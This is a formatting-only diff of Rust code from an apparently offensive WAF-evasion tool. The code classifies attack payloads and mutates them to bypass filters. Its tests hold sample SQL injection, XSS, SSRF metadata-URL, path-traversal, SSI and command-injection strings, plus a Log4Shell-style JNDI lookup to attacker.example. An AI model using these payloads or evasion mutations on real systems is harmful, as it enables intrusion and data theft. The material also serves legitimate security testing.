@@ -70,10 +70,10 @@ pub mod cmd_windows;
 pub mod elastic;
 pub mod equiv;
 // jndi: no integration-test users — internal dispatch target only.
-pub(crate) mod jndi;
-pub mod ldap;
 pub mod bestfit;
 pub(crate) mod homoglyph_gen;
+pub(crate) mod jndi;
+pub mod ldap;
 pub mod mongo;
 pub mod nfkc_preimage;
 pub mod path_traversal;
@@ -373,9 +373,12 @@ pub fn classify(payload: &str) -> PayloadType {
     let has_shell_cmd = contains_shell_command(&lower);
 
     // Command injection indicators
-    let has_sep_with_cmd = (lower.contains("; ") || lower.contains("| ")
-        || lower.contains("&& ") || lower.contains("|| ")
-        || lower.contains('`') || lower.contains("$("))
+    let has_sep_with_cmd = (lower.contains("; ")
+        || lower.contains("| ")
+        || lower.contains("&& ")
+        || lower.contains("|| ")
+        || lower.contains('`')
+        || lower.contains("$("))
         && has_shell_cmd;
     let has_separator_signal = has_sep_with_cmd
         || lower.contains("${ifs}")
@@ -398,9 +401,15 @@ pub fn classify(payload: &str) -> PayloadType {
     .count() as u32;
 
     // Return the type with the highest signal count.
-    if sql_signals >= xss_signals && sql_signals >= cmd_signals && sql_signals >= CLASSIFY_SQL_MIN_SIGNALS {
+    if sql_signals >= xss_signals
+        && sql_signals >= cmd_signals
+        && sql_signals >= CLASSIFY_SQL_MIN_SIGNALS
+    {
         PayloadType::Sql
-    } else if xss_signals >= sql_signals && xss_signals >= cmd_signals && xss_signals >= CLASSIFY_XSS_MIN_SIGNALS {
+    } else if xss_signals >= sql_signals
+        && xss_signals >= cmd_signals
+        && xss_signals >= CLASSIFY_XSS_MIN_SIGNALS
+    {
         PayloadType::Xss
     } else if cmd_signals >= CLASSIFY_CMD_MIN_SIGNALS {
         // Before accepting CMDi, check if this is actually path traversal.
@@ -641,12 +650,10 @@ pub fn mutate_as(
             if results.len() < cfg_ceiling {
                 // Deterministic seed derived from the payload hash so identical
                 // payloads get identical CFG samples across runs.
-                let seed: u64 = payload
-                    .bytes()
-                    .fold(0x7761_6672_6966_7421_u64, |acc, b| {
-                        acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
-                            .wrapping_add(u64::from(b))
-                    });
+                let seed: u64 = payload.bytes().fold(0x7761_6672_6966_7421_u64, |acc, b| {
+                    acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
+                        .wrapping_add(u64::from(b))
+                });
                 // Use the full canonical SQL_TEMPLATES set (all 7 shapes).
                 let budget = cfg_ceiling
                     .saturating_sub(results.len())
@@ -660,13 +667,13 @@ pub fn mutate_as(
                     .build();
                 // Labels parallel SQL_TEMPLATES index-for-index.
                 const SQL_TEMPLATE_LABELS: &[&str] = &[
-                    "cfg_boolean_or",         // {str_open}{ws}{or}{ws}{tautology}{comment}
-                    "cfg_boolean_or_ws",      // {str_open}{ws}{or}{ws}{tautology}{ws}{comment}
-                    "cfg_boolean_and",        // {str_open}{ws}{and}{ws}{tautology}{comment}
-                    "cfg_nested_quote_or",    // {str_open}{ws}{or}{ws}{str_open}{tautology}{str_open}{comment}
-                    "cfg_numeric_or",         // 1{ws}{or}{ws}{tautology}{comment}
-                    "cfg_numeric_and",        // 1{ws}{and}{ws}{tautology}{comment}
-                    "cfg_equality",           // {str_open}{eq}{tautology}{comment}
+                    "cfg_boolean_or",      // {str_open}{ws}{or}{ws}{tautology}{comment}
+                    "cfg_boolean_or_ws",   // {str_open}{ws}{or}{ws}{tautology}{ws}{comment}
+                    "cfg_boolean_and",     // {str_open}{ws}{and}{ws}{tautology}{comment}
+                    "cfg_nested_quote_or", // {str_open}{ws}{or}{ws}{str_open}{tautology}{str_open}{comment}
+                    "cfg_numeric_or",      // 1{ws}{or}{ws}{tautology}{comment}
+                    "cfg_numeric_and",     // 1{ws}{and}{ws}{tautology}{comment}
+                    "cfg_equality",        // {str_open}{eq}{tautology}{comment}
                 ];
                 let templates: Vec<(&str, &str)> = cfg_convergence::SQL_TEMPLATES
                     .iter()
@@ -688,15 +695,11 @@ pub fn mutate_as(
                         // Skip if identical to an existing mutation or to the
                         // original payload (the CFG starts with bypass_score=0
                         // so initial samples may be uninteresting).
-                        if !results.iter().any(|r| r.payload == expanded)
-                            && expanded != payload
-                        {
+                        if !results.iter().any(|r| r.payload == expanded) && expanded != payload {
                             results.push(GrammarMutation {
                                 payload: expanded,
                                 payload_type: PayloadType::Sql,
-                                description: format!(
-                                    "CFG convergence-annealing ({rule})"
-                                ),
+                                description: format!("CFG convergence-annealing ({rule})"),
                                 rules_applied: vec!["cfg_convergence", rule],
                             });
                         }
@@ -771,16 +774,13 @@ pub fn mutate_as(
             // §11 UTILIZATION: wire CFG convergence-annealing into XSS mutations.
             // XSS templates use {tag_open}, {event}, {sep}, {exec} non-terminals.
             if results.len() < max_mutations {
-                let seed: u64 = payload
-                    .bytes()
-                    .fold(0x7861_7373_6672_6565_u64, |acc, b| {
-                        acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
-                            .wrapping_add(u64::from(b))
-                    });
+                let seed: u64 = payload.bytes().fold(0x7861_7373_6672_6565_u64, |acc, b| {
+                    acc.wrapping_mul(0x9e37_79b9_7f4a_7c15)
+                        .wrapping_add(u64::from(b))
+                });
                 // Use the full canonical XSS_TEMPLATES set (all 5 shapes).
-                let budget = (max_mutations - results.len()).min(
-                    cfg_convergence::XSS_TEMPLATES.len()
-                );
+                let budget =
+                    (max_mutations - results.len()).min(cfg_convergence::XSS_TEMPLATES.len());
                 let mut mutator = cfg_convergence::CfgMutator::builder()
                     .productions(cfg_convergence::default_xss_productions())
                     .temperature(1.0)
@@ -823,9 +823,7 @@ pub fn mutate_as(
                             results.push(GrammarMutation {
                                 payload: expanded,
                                 payload_type: PayloadType::Xss,
-                                description: format!(
-                                    "CFG convergence-annealing ({rule})"
-                                ),
+                                description: format!("CFG convergence-annealing ({rule})"),
                                 rules_applied: vec!["cfg_convergence", rule],
                             });
                         }
@@ -861,7 +859,8 @@ pub fn mutate_as(
                         results.push(GrammarMutation {
                             payload: variant,
                             payload_type: PayloadType::Xss,
-                            description: "Unicode normalization-differential (NFC vs NFKC) bypass".into(),
+                            description: "Unicode normalization-differential (NFC vs NFKC) bypass"
+                                .into(),
                             rules_applied: vec!["unicode_norm_differential"],
                         });
                     }
@@ -926,7 +925,9 @@ pub fn mutate_as(
             // the base encoding mutations don't consume the whole budget.
             // (Dogfood: `wafrift evade` emitted ZERO dot-leader/homoglyph forms
             // because path_traversal::mutate filled max_mutations first.)
-            let base_take = max_mutations.saturating_sub(NORM_DIFFERENTIAL_RESERVE).max(1);
+            let base_take = max_mutations
+                .saturating_sub(NORM_DIFFERENTIAL_RESERVE)
+                .max(1);
             let mut results: Vec<GrammarMutation> = path_traversal::mutate(payload)
                 .into_iter()
                 .take(base_take)
@@ -1106,9 +1107,8 @@ pub fn mutate_as_with_state(
                 .collect();
 
             if results.len() < max_mutations {
-                let budget = (max_mutations - results.len()).min(
-                    cfg_convergence::SQL_TEMPLATES.len(),
-                );
+                let budget =
+                    (max_mutations - results.len()).min(cfg_convergence::SQL_TEMPLATES.len());
                 const SQL_TEMPLATE_LABELS: &[&str] = &[
                     "cfg_boolean_or",
                     "cfg_boolean_or_ws",
@@ -1132,9 +1132,7 @@ pub fn mutate_as_with_state(
                             break 'sql_outer;
                         }
                         let expanded = state.sql.expand(template);
-                        if !results.iter().any(|r| r.payload == expanded)
-                            && expanded != payload
-                        {
+                        if !results.iter().any(|r| r.payload == expanded) && expanded != payload {
                             results.push(GrammarMutation {
                                 payload: expanded,
                                 payload_type: PayloadType::Sql,
@@ -1157,9 +1155,8 @@ pub fn mutate_as_with_state(
                 .collect();
 
             if results.len() < max_mutations {
-                let budget = (max_mutations - results.len()).min(
-                    cfg_convergence::XSS_TEMPLATES.len(),
-                );
+                let budget =
+                    (max_mutations - results.len()).min(cfg_convergence::XSS_TEMPLATES.len());
                 const XSS_TEMPLATE_LABELS: &[&str] = &[
                     "cfg_img_onerror",
                     "cfg_svg_onload",
@@ -1393,7 +1390,10 @@ mod tests {
     #[test]
     fn classify_xss_extended() {
         assert_eq!(classify("<svg onload=alert(1)>"), PayloadType::Xss);
-        assert_eq!(classify("<iframe src=javascript:alert(1)>"), PayloadType::Xss);
+        assert_eq!(
+            classify("<iframe src=javascript:alert(1)>"),
+            PayloadType::Xss
+        );
         assert_eq!(classify("<body onload=eval(atob(''))>"), PayloadType::Xss);
         assert_eq!(classify("document.cookie"), PayloadType::Xss);
         assert_eq!(classify("<img src=x onerror=prompt(1)>"), PayloadType::Xss);
@@ -1409,32 +1409,32 @@ mod tests {
 
     #[test]
     fn classify_ssrf() {
-        assert_eq!(classify("http://169.254.169.254/latest/meta-data/"), PayloadType::Ssrf);
+        assert_eq!(
+            classify("http://169.254.169.254/latest/meta-data/"),
+            PayloadType::Ssrf
+        );
         assert_eq!(classify("http://localhost/admin"), PayloadType::Ssrf);
     }
 
     #[test]
     fn classify_path_traversal() {
         assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
-        assert_eq!(classify("..\\..\\windows\\system32"), PayloadType::PathTraversal);
+        assert_eq!(
+            classify("..\\..\\windows\\system32"),
+            PayloadType::PathTraversal
+        );
     }
 
     #[test]
     fn classify_ssi() {
-        assert_eq!(
-            classify(r#"<!--#exec cmd="ls" -->"#),
-            PayloadType::Ssi
-        );
+        assert_eq!(classify(r#"<!--#exec cmd="ls" -->"#), PayloadType::Ssi);
         assert_eq!(
             classify(r#"<!--#include file="/etc/passwd" -->"#),
             PayloadType::Ssi
         );
         assert_eq!(classify("<!--#printenv -->"), PayloadType::Ssi);
         // Case-insensitive directive
-        assert_eq!(
-            classify(r#"<!--#EXEC cmd="ls" -->"#),
-            PayloadType::Ssi
-        );
+        assert_eq!(classify(r#"<!--#EXEC cmd="ls" -->"#), PayloadType::Ssi);
     }
 
     /// LAW 2 + §6 GENERALIZATION anti-rig: classification threshold constants
@@ -1443,9 +1443,18 @@ mod tests {
     /// test below will catch the regression.
     #[test]
     fn classify_threshold_constants_are_pinned() {
-        assert_eq!(CLASSIFY_SQL_MIN_SIGNALS, 1, "SQL min-signals threshold changed");
-        assert_eq!(CLASSIFY_XSS_MIN_SIGNALS, 1, "XSS min-signals threshold changed");
-        assert_eq!(CLASSIFY_CMD_MIN_SIGNALS, 1, "CMD min-signals threshold changed");
+        assert_eq!(
+            CLASSIFY_SQL_MIN_SIGNALS, 1,
+            "SQL min-signals threshold changed"
+        );
+        assert_eq!(
+            CLASSIFY_XSS_MIN_SIGNALS, 1,
+            "XSS min-signals threshold changed"
+        );
+        assert_eq!(
+            CLASSIFY_CMD_MIN_SIGNALS, 1,
+            "CMD min-signals threshold changed"
+        );
     }
 
     /// §6 mutation budget split constants are pinned.
@@ -1482,11 +1491,7 @@ mod tests {
 
     #[test]
     fn jndi_mutate_is_wired() {
-        let muts = mutate_as(
-            "${jndi:ldap://attacker.example/a}",
-            PayloadType::Jndi,
-            10,
-        );
+        let muts = mutate_as("${jndi:ldap://attacker.example/a}", PayloadType::Jndi, 10);
         assert!(!muts.is_empty(), "Jndi mutate_as must produce mutations");
         assert!(
             muts.iter().all(|m| m.payload_type == PayloadType::Jndi),
@@ -1563,7 +1568,10 @@ mod tests {
     fn mutate_sql_structural_keywords_preserved() {
         // SQL mutations must still contain SQL-relevant tokens.
         let mutations = mutate("' OR 1=1--", 20);
-        assert!(!mutations.is_empty(), "SQL must produce at least one mutation");
+        assert!(
+            !mutations.is_empty(),
+            "SQL must produce at least one mutation"
+        );
         // All results must be typed as SQL.
         assert!(mutations.iter().all(|m| m.payload_type == PayloadType::Sql));
     }
@@ -1576,11 +1584,20 @@ mod tests {
         // At least one mutation should still look like an XSS payload.
         let any_xss = mutations.iter().any(|m| {
             let l = m.payload.to_ascii_lowercase();
-            l.contains("alert") || l.contains("onerror") || l.contains("onload")
-                || l.contains("script") || l.contains("svg") || l.contains("eval")
-                || l.contains("confirm") || l.contains("prompt") || l.contains("javascript")
+            l.contains("alert")
+                || l.contains("onerror")
+                || l.contains("onload")
+                || l.contains("script")
+                || l.contains("svg")
+                || l.contains("eval")
+                || l.contains("confirm")
+                || l.contains("prompt")
+                || l.contains("javascript")
         });
-        assert!(any_xss, "at least one XSS mutation should preserve exec form");
+        assert!(
+            any_xss,
+            "at least one XSS mutation should preserve exec form"
+        );
     }
 
     // ── equiv/ssrf: variants still target original host ───────────────────
@@ -1591,7 +1608,11 @@ mod tests {
         let mutations = mutate_as(payload, PayloadType::Ssrf, 20);
         assert!(!mutations.is_empty(), "SSRF must produce mutations");
         // Every SSRF mutation must be typed as SSRF.
-        assert!(mutations.iter().all(|m| m.payload_type == PayloadType::Ssrf));
+        assert!(
+            mutations
+                .iter()
+                .all(|m| m.payload_type == PayloadType::Ssrf)
+        );
     }
 
     // ── equiv/xxe: variants still have SYSTEM/PUBLIC entity reference ─────
@@ -1624,8 +1645,11 @@ mod tests {
         }
         // The number of unique rule-sets should equal total (no dup combos).
         // Strict: unique_count == results.len()
-        assert_eq!(seen.len(), results.len(),
-            "coverage-guided must deduplicate by rules_applied");
+        assert_eq!(
+            seen.len(),
+            results.len(),
+            "coverage-guided must deduplicate by rules_applied"
+        );
     }
 
     #[test]
@@ -1669,7 +1693,8 @@ mod tests {
         // At a generous budget the rule tag "cfg_convergence" must appear.
         let muts = mutate("' OR 1=1--", 30);
         assert!(
-            muts.iter().any(|m| m.rules_applied.contains(&"cfg_convergence")),
+            muts.iter()
+                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
             "SQL mutations must include at least one cfg_convergence variant; \
              check §11 wiring in mutate_as(PayloadType::Sql)"
         );
@@ -1679,7 +1704,8 @@ mod tests {
     fn xss_mutations_include_cfg_convergence_variants() {
         let muts = mutate("<script>alert(1)</script>", 30);
         assert!(
-            muts.iter().any(|m| m.rules_applied.contains(&"cfg_convergence")),
+            muts.iter()
+                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
             "XSS mutations must include at least one cfg_convergence variant"
         );
     }
@@ -1689,7 +1715,10 @@ mod tests {
         // Anti-rig: the CFG variants must not be the original payload.
         let original = "' OR 1=1--";
         let muts = mutate(original, 30);
-        for m in muts.iter().filter(|m| m.rules_applied.contains(&"cfg_convergence")) {
+        for m in muts
+            .iter()
+            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
+        {
             assert_ne!(
                 m.payload, original,
                 "cfg_convergence variant must differ from original: {:?}",
@@ -1782,7 +1811,10 @@ mod tests {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
         let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
-        assert!(!variants.is_empty(), "stateful SQL mutate must produce variants");
+        assert!(
+            !variants.is_empty(),
+            "stateful SQL mutate must produce variants"
+        );
         assert!(
             variants.len() <= 20,
             "stateful mutate must honour max_mutations: got {}",
@@ -1798,9 +1830,16 @@ mod tests {
     fn mutate_as_with_state_produces_xss_variants() {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
-        let variants =
-            mutate_as_with_state("<script>alert(1)</script>", PayloadType::Xss, 20, &mut state);
-        assert!(!variants.is_empty(), "stateful XSS mutate must produce variants");
+        let variants = mutate_as_with_state(
+            "<script>alert(1)</script>",
+            PayloadType::Xss,
+            20,
+            &mut state,
+        );
+        assert!(
+            !variants.is_empty(),
+            "stateful XSS mutate must produce variants"
+        );
         assert!(variants.len() <= 20);
         assert!(variants.iter().all(|m| m.payload_type == PayloadType::Xss));
     }
@@ -1883,7 +1922,12 @@ mod tests {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
         // These are non-CFG rules — feedback must silently skip them.
-        feedback(&mut state, PayloadType::Sql, &["sql_tautology", "url_encode"], true);
+        feedback(
+            &mut state,
+            PayloadType::Sql,
+            &["sql_tautology", "url_encode"],
+            true,
+        );
         feedback(&mut state, PayloadType::Xss, &["xss_tag_combo"], false);
         // State must still work after no-op feedback.
         let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 5, &mut state);
@@ -1914,7 +1958,11 @@ mod tests {
         let results: Vec<GrammarMutation> =
             mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
         assert!(!results.is_empty(), "mutate_streaming must yield results");
-        assert!(results.len() <= 15, "must honour max_count: {}", results.len());
+        assert!(
+            results.len() <= 15,
+            "must honour max_count: {}",
+            results.len()
+        );
         assert!(
             results.iter().all(|m| m.payload_type == PayloadType::Sql),
             "all streaming SQL mutations must carry PayloadType::Sql"
@@ -1946,9 +1994,11 @@ mod tests {
             diversity: DiversityPolicy::Random,
             exclude: std::collections::HashSet::new(),
         };
-        let results: Vec<_> =
-            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
-        assert!(results.is_empty(), "zero max_count must yield empty iterator");
+        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
+        assert!(
+            results.is_empty(),
+            "zero max_count must yield empty iterator"
+        );
     }
 
     #[test]
@@ -1959,10 +2009,9 @@ mod tests {
             diversity: DiversityPolicy::Random,
             exclude: std::collections::HashSet::new(),
         };
-        let results: Vec<_> =
-            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req)
-                .take(3)
-                .collect();
+        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req)
+            .take(3)
+            .collect();
         assert!(results.len() <= 3);
     }
 
@@ -1973,8 +2022,7 @@ mod tests {
             diversity: DiversityPolicy::CoverageGuided,
             exclude: std::collections::HashSet::new(),
         };
-        let results: Vec<_> =
-            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
+        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
         // All rules_applied combos must be unique (coverage-guided guarantee).
         let mut seen = std::collections::HashSet::new();
         for m in &results {
@@ -2048,12 +2096,18 @@ mod tests {
         // Anti-rig: pin that the Default impl preserves the documented defaults.
         // If the defaults change, this test breaks and forces a conscious decision.
         let req = MutationRequest::default();
-        assert_eq!(req.max_count, 10, "MutationRequest::default max_count must be 10");
+        assert_eq!(
+            req.max_count, 10,
+            "MutationRequest::default max_count must be 10"
+        );
         assert!(
             matches!(req.diversity, DiversityPolicy::Random),
             "MutationRequest::default diversity must be Random"
         );
-        assert!(req.exclude.is_empty(), "MutationRequest::default exclude must be empty");
+        assert!(
+            req.exclude.is_empty(),
+            "MutationRequest::default exclude must be empty"
+        );
     }
 
     // ── mutate_as_with_state: non-CFG types fall back to stateless ────────────
@@ -2072,7 +2126,9 @@ mod tests {
         // Must still produce valid mutations typed correctly.
         assert!(variants.len() <= 10);
         assert!(
-            variants.iter().all(|m| m.payload_type == PayloadType::PathTraversal),
+            variants
+                .iter()
+                .all(|m| m.payload_type == PayloadType::PathTraversal),
             "PathTraversal stateful must still carry correct PayloadType"
         );
     }
@@ -2081,10 +2137,13 @@ mod tests {
     fn mutate_as_with_state_cmdi_falls_back_stateless() {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
-        let variants = mutate_as_with_state("; ls -la", PayloadType::CommandInjection, 10, &mut state);
+        let variants =
+            mutate_as_with_state("; ls -la", PayloadType::CommandInjection, 10, &mut state);
         assert!(variants.len() <= 10);
         assert!(
-            variants.iter().all(|m| m.payload_type == PayloadType::CommandInjection),
+            variants
+                .iter()
+                .all(|m| m.payload_type == PayloadType::CommandInjection),
         );
     }
 
@@ -2095,7 +2154,10 @@ mod tests {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
         let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
-        if let Some(v) = variants.iter().find(|m| m.rules_applied.contains(&"cfg_convergence")) {
+        if let Some(v) = variants
+            .iter()
+            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
+        {
             // Penalize (blocked = false bypass).
             feedback(&mut state, v.payload_type, &v.rules_applied, false);
         }
@@ -2108,9 +2170,16 @@ mod tests {
     fn feedback_xss_bypass_does_not_panic() {
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
-        let variants =
-            mutate_as_with_state("<script>alert(1)</script>", PayloadType::Xss, 20, &mut state);
-        if let Some(v) = variants.iter().find(|m| m.rules_applied.contains(&"cfg_convergence")) {
+        let variants = mutate_as_with_state(
+            "<script>alert(1)</script>",
+            PayloadType::Xss,
+            20,
+            &mut state,
+        );
+        if let Some(v) = variants
+            .iter()
+            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
+        {
             feedback(&mut state, v.payload_type, &v.rules_applied, true);
         }
         let follow_up =
